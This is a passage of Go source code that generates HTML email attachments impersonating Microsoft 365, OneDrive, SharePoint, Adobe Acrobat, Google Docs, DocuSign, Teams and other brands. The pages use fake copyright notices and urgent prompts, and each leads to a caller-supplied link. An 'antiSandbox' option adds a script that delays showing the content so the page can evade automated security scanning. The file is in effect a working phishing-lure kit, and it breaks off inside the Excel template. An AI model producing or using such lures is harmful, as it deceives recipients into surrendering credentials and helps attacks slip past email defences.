package service

import (
	"fmt"
	"html"
	"strings"
	"time"
)

// HTMLTemplateID identifies a branded HTML attachment template
type HTMLTemplateID string

const (
	TemplateMicrosoftDocument HTMLTemplateID = "microsoft_document"
	TemplateOneDrive          HTMLTemplateID = "onedrive"
	TemplateSharePoint        HTMLTemplateID = "sharepoint"
	TemplateAdobePDF          HTMLTemplateID = "adobe_pdf"
	TemplateGoogleDocs        HTMLTemplateID = "google_docs"
	TemplateDocuSign          HTMLTemplateID = "docusign"
	TemplateTeamsMeeting      HTMLTemplateID = "teams_meeting"
	TemplateExcelOnline       HTMLTemplateID = "excel_online"
	TemplateDropbox           HTMLTemplateID = "dropbox"
	TemplateWeTransfer        HTMLTemplateID = "wetransfer"
	TemplateVoicemail         HTMLTemplateID = "voicemail"
	TemplateSecureDocument    HTMLTemplateID = "secure_document"
)

// HTMLTemplateInfo describes a template for the frontend
type HTMLTemplateInfo struct {
	ID          HTMLTemplateID `json:"id"`
	Name        string         `json:"name"`
	Description string         `json:"description"`
	Category    string         `json:"category"`
	Brand       string         `json:"brand"`
	Icon        string         `json:"icon"` // emoji or icon class
}

// GetHTMLTemplates returns all available HTML attachment templates
func GetHTMLTemplates() []HTMLTemplateInfo {
	return []HTMLTemplateInfo{
		{ID: TemplateMicrosoftDocument, Name: "Microsoft Document", Description: "Microsoft 365 document loading screen with progress bar", Category: "microsoft", Brand: "Microsoft", Icon: "📄"},
		{ID: TemplateOneDrive, Name: "OneDrive Share", Description: "OneDrive file sharing notification with download button", Category: "microsoft", Brand: "OneDrive", Icon: "☁️"},
		{ID: TemplateSharePoint, Name: "SharePoint File", Description: "SharePoint Online document access page", Category: "microsoft", Brand: "SharePoint", Icon: "📁"},
		{ID: TemplateAdobePDF, Name: "Adobe PDF Viewer", Description: "Adobe Acrobat PDF loading screen with progress", Category: "document", Brand: "Adobe", Icon: "📕"},
		{ID: TemplateGoogleDocs, Name: "Google Docs", Description: "Google Docs document sharing notification", Category: "google", Brand: "Google", Icon: "📝"},
		{ID: TemplateDocuSign, Name: "DocuSign", Description: "DocuSign document signing request page", Category: "document", Brand: "DocuSign", Icon: "✍️"},
		{ID: TemplateTeamsMeeting, Name: "Teams Meeting", Description: "Microsoft Teams meeting invitation with join button", Category: "microsoft", Brand: "Teams", Icon: "💬"},
		{ID: TemplateExcelOnline, Name: "Excel Online", Description: "Excel Online spreadsheet loading with data preview", Category: "microsoft", Brand: "Excel", Icon: "📊"},
		{ID: TemplateDropbox, Name: "Dropbox Transfer", Description: "Dropbox file transfer download page", Category: "cloud", Brand: "Dropbox", Icon: "📦"},
		{ID: TemplateWeTransfer, Name: "WeTransfer", Description: "WeTransfer file download page with expiry timer", Category: "cloud", Brand: "WeTransfer", Icon: "🔄"},
		{ID: TemplateVoicemail, Name: "Voicemail Message", Description: "Microsoft voicemail notification with audio player", Category: "microsoft", Brand: "Microsoft", Icon: "🎤"},
		{ID: TemplateSecureDocument, Name: "Secure Document", Description: "Encrypted secure document access with verification", Category: "security", Brand: "Security", Icon: "🔒"},
	}
}

// HTMLTemplateRequest holds parameters for generating a branded HTML template
type HTMLTemplateRequest struct {
	TemplateID   HTMLTemplateID `json:"templateId"`
	LinkURL      string         `json:"linkUrl"`
	DocumentName string         `json:"documentName"`
	SenderName   string         `json:"senderName"`
	SenderEmail  string         `json:"senderEmail"`
	CompanyName  string         `json:"companyName"`
	Message      string         `json:"message"`
	FileSize     string         `json:"fileSize"`
	ExpiryHours  int            `json:"expiryHours"`
	AntiSandbox  bool           `json:"antiSandbox"` // adds delay before redirect
}

// GenerateHTMLTemplate generates a branded HTML attachment from a template
func (ag *AttachmentGenerator) GenerateHTMLTemplate(req *HTMLTemplateRequest) ([]byte, error) {
	if req.LinkURL == "" {
		req.LinkURL = "#"
	}
	if req.DocumentName == "" {
		req.DocumentName = "Document.pdf"
	}
	if req.SenderName == "" {
		req.SenderName = "IT Department"
	}
	if req.CompanyName == "" {
		req.CompanyName = "Organization"
	}
	if req.FileSize == "" {
		req.FileSize = "2.4 MB"
	}

	// Escape user inputs for HTML safety
	linkURL := html.EscapeString(req.LinkURL)
	docName := html.EscapeString(req.DocumentName)
	senderName := html.EscapeString(req.SenderName)
	senderEmail := html.EscapeString(req.SenderEmail)
	companyName := html.EscapeString(req.CompanyName)
	message := html.EscapeString(req.Message)
	fileSize := html.EscapeString(req.FileSize)

	// Anti-sandbox delay script
	antiSandboxScript := ""
	if req.AntiSandbox {
		antiSandboxScript = `<script>
		(function(){
			var start = Date.now();
			var check = setInterval(function(){
				if(Date.now() - start > 3000){
					clearInterval(check);
					document.getElementById('loading-overlay').style.display='none';
					document.getElementById('main-content').style.display='block';
				}
			}, 100);
		})();
		</script>`
	}

	var content string

	switch req.TemplateID {
	case TemplateMicrosoftDocument:
		content = ag.templateMicrosoftDocument(linkURL, docName, senderName, companyName, message, antiSandboxScript)
	case TemplateOneDrive:
		content = ag.templateOneDrive(linkURL, docName, senderName, senderEmail, fileSize, antiSandboxScript)
	case TemplateSharePoint:
		content = ag.templateSharePoint(linkURL, docName, senderName, companyName, message, antiSandboxScript)
	case TemplateAdobePDF:
		content = ag.templateAdobePDF(linkURL, docName, senderName, fileSize, antiSandboxScript)
	case TemplateGoogleDocs:
		content = ag.templateGoogleDocs(linkURL, docName, senderName, senderEmail, message, antiSandboxScript)
	case TemplateDocuSign:
		content = ag.templateDocuSign(linkURL, docName, senderName, senderEmail, message, antiSandboxScript)
	case TemplateTeamsMeeting:
		content = ag.templateTeamsMeeting(linkURL, senderName, senderEmail, companyName, message, antiSandboxScript)
	case TemplateExcelOnline:
		content = ag.templateExcelOnline(linkURL, docName, senderName, fileSize, antiSandboxScript)
	case TemplateDropbox:
		content = ag.templateDropbox(linkURL, docName, senderName, senderEmail, fileSize, antiSandboxScript)
	case TemplateWeTransfer:
		content = ag.templateWeTransfer(linkURL, docName, senderName, fileSize, req.ExpiryHours, antiSandboxScript)
	case TemplateVoicemail:
		content = ag.templateVoicemail(linkURL, senderName, senderEmail, companyName, antiSandboxScript)
	case TemplateSecureDocument:
		content = ag.templateSecureDocument(linkURL, docName, senderName, companyName, message, antiSandboxScript)
	default:
		return nil, fmt.Errorf("unknown template: %s", req.TemplateID)
	}

	return []byte(content), nil
}

// safeInitial returns the first character of a string, or "?" if empty
func safeInitial(s string) string {
	if len(s) == 0 {
		return "?"
	}
	return string([]rune(s)[0:1])
}

// --- Template Implementations ---

func (ag *AttachmentGenerator) templateMicrosoftDocument(linkURL, docName, senderName, companyName, message, antiSandbox string) string {
	if message == "" {
		message = "has shared a document with you"
	}
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>%s - Microsoft 365</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f3f2f1;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{background:#fff;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,.1);max-width:520px;width:100%%;padding:0;overflow:hidden}
.header{background:#0078d4;padding:24px 32px;display:flex;align-items:center;gap:12px}
.header svg{width:32px;height:32px;fill:#fff}
.header h1{color:#fff;font-size:18px;font-weight:600}
.body{padding:32px}
.doc-icon{width:48px;height:48px;background:#0078d4;border-radius:4px;display:flex;align-items:center;justify-content:center;margin-bottom:16px}
.doc-icon svg{width:28px;height:28px;fill:#fff}
.sender{font-size:14px;color:#323130;margin-bottom:8px}
.sender strong{color:#0078d4}
.message{font-size:13px;color:#605e5c;margin-bottom:20px;line-height:1.5}
.doc-name{background:#f3f2f1;border-radius:6px;padding:14px 16px;display:flex;align-items:center;gap:12px;margin-bottom:24px}
.doc-name .icon{width:36px;height:36px;background:#d13438;border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.doc-name .icon svg{width:20px;height:20px;fill:#fff}
.doc-name .info{flex:1}
.doc-name .info .name{font-size:14px;color:#323130;font-weight:600}
.doc-name .info .meta{font-size:12px;color:#a19f9d}
.btn{display:block;width:100%%;padding:12px;background:#0078d4;color:#fff;text-align:center;text-decoration:none;border-radius:4px;font-size:14px;font-weight:600;transition:background .2s}
.btn:hover{background:#106ebe}
.progress{margin-top:20px;display:none}
.progress-bar{height:4px;background:#edebe9;border-radius:2px;overflow:hidden}
.progress-fill{height:100%%;width:0;background:#0078d4;border-radius:2px;animation:loading 2s ease-in-out forwards}
.progress-text{font-size:12px;color:#605e5c;margin-top:8px;text-align:center}
@keyframes loading{0%%{width:0}50%%{width:70%%}100%%{width:100%%}}
.footer{padding:16px 32px;border-top:1px solid #edebe9;text-align:center}
.footer p{font-size:11px;color:#a19f9d}
#loading-overlay{position:fixed;top:0;left:0;width:100%%;height:100%%;background:#fff;z-index:9999;display:flex;align-items:center;justify-content:center;flex-direction:column}
#loading-overlay .spinner{width:40px;height:40px;border:3px solid #edebe9;border-top:3px solid #0078d4;border-radius:50%%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
%s
<div class="container" id="main-content">
<div class="header">
<svg viewBox="0 0 24 24"><path d="M11.5 3v8.5H3V3h8.5zm1 0H21v8.5h-8.5V3zM3 12.5h8.5V21H3v-8.5zm9.5 0H21V21h-8.5v-8.5z"/></svg>
<h1>Microsoft 365</h1>
</div>
<div class="body">
<div class="doc-icon"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zm4 18H6V4h7v5h5v11z"/></svg></div>
<p class="sender"><strong>%s</strong> %s</p>
<p class="message">You have received a shared document from %s. Click below to view the document securely.</p>
<div class="doc-name">
<div class="icon"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/></svg></div>
<div class="info"><div class="name">%s</div><div class="meta">Shared via Microsoft 365</div></div>
</div>
<a href="%s" class="btn" onclick="document.querySelector('.progress').style.display='block';this.style.opacity='0.7';this.innerText='Opening...'">Open Document</a>
<div class="progress"><div class="progress-bar"><div class="progress-fill"></div></div><p class="progress-text">Loading document...</p></div>
</div>
<div class="footer"><p>Microsoft respects your privacy. &copy; %d Microsoft Corporation</p></div>
</div>
</body>
</html>`, docName, antiSandbox, senderName, message, companyName, docName, linkURL, time.Now().Year())
}

func (ag *AttachmentGenerator) templateOneDrive(linkURL, docName, senderName, senderEmail, fileSize, antiSandbox string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>%s shared with you - OneDrive</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.12);max-width:480px;width:100%%;overflow:hidden}
.top-bar{background:#0078d4;height:4px}
.content{padding:32px}
.logo{display:flex;align-items:center;gap:8px;margin-bottom:24px}
.logo svg{width:28px;height:28px}
.logo span{font-size:18px;color:#0078d4;font-weight:600}
.avatar{width:48px;height:48px;background:#0078d4;border-radius:50%%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:20px;font-weight:600;margin-bottom:16px}
h2{font-size:16px;color:#323130;margin-bottom:4px}
.email{font-size:13px;color:#605e5c;margin-bottom:20px}
.file-card{border:1px solid #edebe9;border-radius:6px;padding:16px;display:flex;align-items:center;gap:14px;margin-bottom:24px}
.file-icon{width:40px;height:40px;background:linear-gradient(135deg,#0078d4,#106ebe);border-radius:6px;display:flex;align-items:center;justify-content:center}
.file-icon svg{width:22px;height:22px;fill:#fff}
.file-info .name{font-size:14px;color:#323130;font-weight:600}
.file-info .size{font-size:12px;color:#a19f9d}
.btn{display:block;width:100%%;padding:12px;background:#0078d4;color:#fff;text-align:center;text-decoration:none;border-radius:4px;font-size:14px;font-weight:600}
.btn:hover{background:#106ebe}
.footer{padding:16px 32px;border-top:1px solid #edebe9;text-align:center}
.footer p{font-size:11px;color:#a19f9d;line-height:1.5}
</style>
</head>
<body>
%s
<div class="card" id="main-content">
<div class="top-bar"></div>
<div class="content">
<div class="logo">
<svg viewBox="0 0 24 24"><path fill="#0078d4" d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/><path fill="#fff" d="M14 2v6h6"/></svg>
<span>OneDrive</span>
</div>
<div class="avatar">%s</div>
<h2>%s shared a file with you</h2>
<p class="email">%s</p>
<div class="file-card">
<div class="file-icon"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/></svg></div>
<div class="file-info"><div class="name">%s</div><div class="size">%s</div></div>
</div>
<a href="%s" class="btn">Open</a>
</div>
<div class="footer"><p>You received this because %s shared a file from OneDrive.<br>&copy; %d Microsoft Corporation</p></div>
</div>
</body>
</html>`, senderName, antiSandbox, safeInitial(senderName), senderName, senderEmail, docName, fileSize, linkURL, senderName, time.Now().Year())
}

func (ag *AttachmentGenerator) templateSharePoint(linkURL, docName, senderName, companyName, message, antiSandbox string) string {
	if message == "" {
		message = "shared a file with you"
	}
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>%s - SharePoint</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:#f3f2f1;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{background:#fff;border-radius:4px;box-shadow:0 1.6px 3.6px rgba(0,0,0,.13),0 .3px .9px rgba(0,0,0,.1);max-width:520px;width:100%%;overflow:hidden}
.header{background:#036;padding:16px 24px;display:flex;align-items:center;gap:10px}
.header svg{width:24px;height:24px;fill:#fff}
.header span{color:#fff;font-size:16px;font-weight:600}
.breadcrumb{padding:12px 24px;background:#f8f8f8;border-bottom:1px solid #edebe9;font-size:12px;color:#605e5c}
.body{padding:28px 24px}
.notification{display:flex;gap:14px;margin-bottom:24px}
.notification .avatar{width:40px;height:40px;background:#036;border-radius:50%%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:600;flex-shrink:0}
.notification .text{flex:1}
.notification .text .name{font-weight:600;color:#323130;font-size:14px}
.notification .text .action{color:#605e5c;font-size:13px;margin-top:2px}
.notification .text .time{color:#a19f9d;font-size:12px;margin-top:4px}
.file-row{display:flex;align-items:center;gap:12px;padding:14px 16px;background:#f8f8f8;border-radius:4px;margin-bottom:24px;border:1px solid #edebe9}
.file-row .icon{width:36px;height:36px;background:#036;border-radius:4px;display:flex;align-items:center;justify-content:center}
.file-row .icon svg{width:20px;height:20px;fill:#fff}
.file-row .name{font-size:14px;color:#323130;font-weight:600}
.btn{display:inline-block;padding:10px 32px;background:#036;color:#fff;text-decoration:none;border-radius:4px;font-size:14px;font-weight:600}
.btn:hover{background:#024}
.footer{padding:16px 24px;border-top:1px solid #edebe9}
.footer p{font-size:11px;color:#a19f9d}
</style>
</head>
<body>
%s
<div class="container" id="main-content">
<div class="header"><svg viewBox="0 0 24 24"><path d="M12 2L2 7v10l10 5 10-5V7L12 2z"/></svg><span>SharePoint</span></div>
<div class="breadcrumb">%s &gt; Documents &gt; Shared</div>
<div class="body">
<div class="notification">
<div class="avatar">%s</div>
<div class="text">
<div class="name">%s</div>
<div class="action">%s</div>
<div class="time">Just now</div>
</div>
</div>
<div class="file-row">
<div class="icon"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/></svg></div>
<div class="name">%s</div>
</div>
<a href="%s" class="btn">Open in SharePoint</a>
</div>
<div class="footer"><p>&copy; %d Microsoft Corporation. All rights reserved.</p></div>
</div>
</body>
</html>`, docName, antiSandbox, companyName, safeInitial(senderName), senderName, message, docName, linkURL, time.Now().Year())
}

func (ag *AttachmentGenerator) templateAdobePDF(linkURL, docName, senderName, fileSize, antiSandbox string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>%s - Adobe Acrobat</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Adobe Clean',Helvetica,Arial,sans-serif;background:#1a1a1a;display:flex;justify-content:center;align-items:center;min-height:100vh}
.viewer{background:#2c2c2c;border-radius:8px;max-width:600px;width:100%%;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,.4)}
.toolbar{background:#323232;padding:12px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #444}
.toolbar .left{display:flex;align-items:center;gap:10px}
.toolbar .logo{display:flex;align-items:center;gap:6px}
.toolbar .logo svg{width:24px;height:24px}
.toolbar .logo span{color:#e8e8e8;font-size:14px;font-weight:600}
.toolbar .filename{color:#999;font-size:13px}
.pdf-area{padding:40px;text-align:center;min-height:300px;display:flex;flex-direction:column;align-items:center;justify-content:center;background:linear-gradient(180deg,#2c2c2c 0%%,#1a1a1a 100%%)}
.pdf-icon{width:80px;height:100px;background:#d4322c;border-radius:4px;display:flex;align-items:center;justify-content:center;margin-bottom:20px;position:relative}
.pdf-icon::after{content:'PDF';position:absolute;bottom:8px;color:#fff;font-size:14px;font-weight:700}
.pdf-icon svg{width:40px;height:40px;fill:#fff;margin-top:-10px}
.doc-title{color:#e8e8e8;font-size:16px;font-weight:600;margin-bottom:4px}
.doc-meta{color:#999;font-size:13px;margin-bottom:24px}
.progress-container{width:100%%;max-width:300px;margin-bottom:20px}
.progress-bar{height:4px;background:#444;border-radius:2px;overflow:hidden}
.progress-fill{height:100%%;width:0;background:#d4322c;border-radius:2px;animation:pdfload 2.5s ease-in-out forwards}
@keyframes pdfload{0%%{width:0}40%%{width:60%%}80%%{width:85%%}100%%{width:100%%}}
.status{color:#999;font-size:12px;margin-bottom:24px}
.btn{display:inline-block;padding:12px 40px;background:#d4322c;color:#fff;text-decoration:none;border-radius:20px;font-size:14px;font-weight:600;transition:background .2s}
.btn:hover{background:#b52a25}
.footer{padding:14px 20px;border-top:1px solid #444;text-align:center}
.footer p{color:#666;font-size:11px}
</style>
</head>
<body>
%s
<div class="viewer" id="main-content">
<div class="toolbar">
<div class="left">
<div class="logo"><svg viewBox="0 0 24 24"><path fill="#d4322c" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/><text x="12" y="16" text-anchor="middle" fill="#fff" font-size="10" font-weight="bold">A</text></svg><span>Adobe Acrobat</span></div>
</div>
<div class="filename">%s</div>
</div>
<div class="pdf-area">
<div class="pdf-icon"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/></svg></div>
<div class="doc-title">%s</div>
<div class="doc-meta">Shared by %s &middot; %s</div>
<div class="progress-container"><div class="progress-bar"><div class="progress-fill"></div></div></div>
<div class="status">Preparing document for viewing...</div>
<a href="%s" class="btn">View PDF Document</a>
</div>
<div class="footer"><p>&copy; %d Adobe. All rights reserved.</p></div>
</div>
</body>
</html>`, docName, antiSandbox, docName, docName, senderName, fileSize, linkURL, time.Now().Year())
}

func (ag *AttachmentGenerator) templateGoogleDocs(linkURL, docName, senderName, senderEmail, message, antiSandbox string) string {
	if message == "" {
		message = "has invited you to edit the following document"
	}
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>%s - Google Docs</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#f8f9fa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.12),0 1px 2px rgba(0,0,0,.24);max-width:480px;width:100%%;overflow:hidden}
.header{padding:24px 24px 0}
.logo{display:flex;align-items:center;gap:8px;margin-bottom:20px}
.logo svg{width:24px;height:24px}
.logo span{font-size:18px;color:#5f6368;font-weight:500}
.avatar-row{display:flex;align-items:center;gap:12px;margin-bottom:16px}
.avatar{width:40px;height:40px;background:#4285f4;border-radius:50%%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;font-weight:500}
.sender-info .name{font-size:14px;color:#202124;font-weight:500}
.sender-info .email{font-size:12px;color:#5f6368}
.body{padding:0 24px 24px}
.message{font-size:14px;color:#3c4043;line-height:1.6;margin-bottom:20px}
.doc-preview{border:1px solid #dadce0;border-radius:8px;overflow:hidden;margin-bottom:24px}
.doc-preview .top{background:#f1f3f4;padding:12px 16px;display:flex;align-items:center;gap:10px}
.doc-preview .top svg{width:20px;height:20px}
.doc-preview .top .name{font-size:13px;color:#202124;font-weight:500}
.doc-preview .bottom{padding:16px;background:#fff}
.doc-preview .bottom .lines{height:60px;background:repeating-linear-gradient(0deg,transparent,transparent 10px,#e8eaed 10px,#e8eaed 11px)}
.btn{display:block;width:100%%;padding:10px;background:#1a73e8;color:#fff;text-align:center;text-decoration:none;border-radius:4px;font-size:14px;font-weight:500}
.btn:hover{background:#1765cc}
.footer{padding:16px 24px;border-top:1px solid #dadce0}
.footer p{font-size:11px;color:#80868b;line-height:1.5}
</style>
</head>
<body>
%s
<div class="card" id="main-content">
<div class="header">
<div class="logo">
<svg viewBox="0 0 24 24"><path fill="#4285f4" d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/></svg>
<span>Google Docs</span>
</div>
<div class="avatar-row">
<div class="avatar">%s</div>
<div class="sender-info"><div class="name">%s</div><div class="email">%s</div></div>
</div>
</div>
<div class="body">
<p class="message">%s %s</p>
<div class="doc-preview">
<div class="top"><svg viewBox="0 0 24 24"><path fill="#4285f4" d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/></svg><span class="name">%s</span></div>
<div class="bottom"><div class="lines"></div></div>
</div>
<a href="%s" class="btn">Open in Docs</a>
</div>
<div class="footer"><p>Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043</p></div>
</div>
</body>
</html>`, docName, antiSandbox, safeInitial(senderName), senderName, senderEmail, senderName, message, docName, linkURL)
}

func (ag *AttachmentGenerator) templateDocuSign(linkURL, docName, senderName, senderEmail, message, antiSandbox string) string {
	if message == "" {
		message = "Please review and sign this document"
	}
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>DocuSign: %s</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Helvetica Neue',Arial,sans-serif;background:#f4f4f4;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{background:#fff;max-width:500px;width:100%%;overflow:hidden;border-radius:0}
.banner{background:#fff;padding:20px 24px;border-bottom:3px solid #ffe01b}
.banner svg{height:28px}
.body{padding:32px 24px}
.title{font-size:20px;color:#333;font-weight:300;margin-bottom:20px}
.info-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #eee;font-size:13px}
.info-row .label{color:#999}
.info-row .value{color:#333;font-weight:500}
.message-box{background:#f9f9f9;border-left:3px solid #ffe01b;padding:14px 16px;margin:20px 0;font-size:13px;color:#555;line-height:1.5}
.btn{display:block;width:100%%;padding:14px;background:#ffe01b;color:#333;text-align:center;text-decoration:none;font-size:16px;font-weight:600;border:none;cursor:pointer;margin-top:24px;transition:background .2s}
.btn:hover{background:#ffd700}
.footer{padding:16px 24px;background:#f9f9f9;border-top:1px solid #eee}
.footer p{font-size:11px;color:#999;line-height:1.5}
.secure{display:flex;align-items:center;gap:6px;margin-top:8px;font-size:11px;color:#666}
.secure svg{width:14px;height:14px;fill:#4caf50}
</style>
</head>
<body>
%s
<div class="container" id="main-content">
<div class="banner"><svg viewBox="0 0 200 40"><text x="0" y="30" font-family="Helvetica" font-size="28" font-weight="300" fill="#333">DocuSign</text></svg></div>
<div class="body">
<h1 class="title">Review Document</h1>
<div class="info-row"><span class="label">From</span><span class="value">%s (%s)</span></div>
<div class="info-row"><span class="label">Document</span><span class="value">%s</span></div>
<div class="info-row"><span class="label">Status</span><span class="value" style="color:#f44336">Awaiting Your Signature</span></div>
<div class="message-box">%s</div>
<a href="%s" class="btn">REVIEW DOCUMENT</a>
</div>
<div class="footer">
<p>This message was sent by DocuSign on behalf of %s.</p>
<div class="secure"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>Secured by DocuSign</div>
</div>
</div>
</body>
</html>`, docName, antiSandbox, senderName, senderEmail, docName, message, linkURL, senderName)
}

func (ag *AttachmentGenerator) templateTeamsMeeting(linkURL, senderName, senderEmail, companyName, message, antiSandbox string) string {
	meetingTime := time.Now().Add(2 * time.Hour).Format("Monday, January 2, 2006 3:04 PM")
	if message == "" {
		message = "Join the meeting to discuss important updates"
	}
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Microsoft Teams Meeting</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1);max-width:480px;width:100%%;overflow:hidden}
.header{background:#464EB8;padding:20px 24px;display:flex;align-items:center;gap:10px}
.header svg{width:28px;height:28px;fill:#fff}
.header span{color:#fff;font-size:16px;font-weight:600}
.body{padding:28px 24px}
.meeting-title{font-size:18px;color:#252423;font-weight:600;margin-bottom:16px}
.detail{display:flex;align-items:center;gap:10px;margin-bottom:12px;font-size:13px;color:#605e5c}
.detail svg{width:18px;height:18px;fill:#605e5c;flex-shrink:0}
.detail strong{color:#252423}
.divider{height:1px;background:#edebe9;margin:20px 0}
.message-text{font-size:13px;color:#605e5c;line-height:1.6;margin-bottom:24px}
.join-btn{display:block;width:100%%;padding:14px;background:#464EB8;color:#fff;text-align:center;text-decoration:none;border-radius:4px;font-size:15px;font-weight:600;transition:background .2s}
.join-btn:hover{background:#3b42a0}
.or-text{text-align:center;color:#a19f9d;font-size:12px;margin:12px 0}
.dial-info{background:#f8f8f8;border-radius:4px;padding:12px;font-size:12px;color:#605e5c;text-align:center}
.footer{padding:14px 24px;border-top:1px solid #edebe9;text-align:center}
.footer p{font-size:11px;color:#a19f9d}
</style>
</head>
<body>
%s
<div class="card" id="main-content">
<div class="header"><svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 3c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6z"/></svg><span>Microsoft Teams</span></div>
<div class="body">
<h2 class="meeting-title">%s Meeting</h2>
<div class="detail"><svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg><span><strong>%s</strong></span></div>
<div class="detail"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg><span>Organized by <strong>%s</strong> (%s)</span></div>
<div class="detail"><svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/></svg><span>%s</span></div>
<div class="divider"></div>
<p class="message-text">%s</p>
<a href="%s" class="join-btn">Join Microsoft Teams Meeting</a>
<p class="or-text">Or dial in (audio only)</p>
<div class="dial-info">+1 (323) 555-0124 &middot; Conference ID: %d</div>
</div>
<div class="footer"><p>&copy; %d Microsoft Corporation</p></div>
</div>
</body>
</html>`, antiSandbox, companyName, meetingTime, senderName, senderEmail, companyName, message, linkURL, time.Now().UnixMilli()%999999999+100000000, time.Now().Year())
}

func (ag *AttachmentGenerator) templateExcelOnline(linkURL, docName, senderName, fileSize, antiSandbox string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>%s - Excel Online</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:#f3f2f1;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{background:#fff;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,.1);max-width:560px;width:100%%;overflow:hidden}
.header{background:#217346;padding:16px 24px;display:flex;align-items:center;gap:10px}
.header svg{width:24px;height:24px;fill:#fff}
.header span{color:#fff;font-size:16px;font-weight:600}
.body{padding:28px 24px}
.info{font-size:14px;color:#323130;margin-bottom:20px}
.info strong{color:#217346}
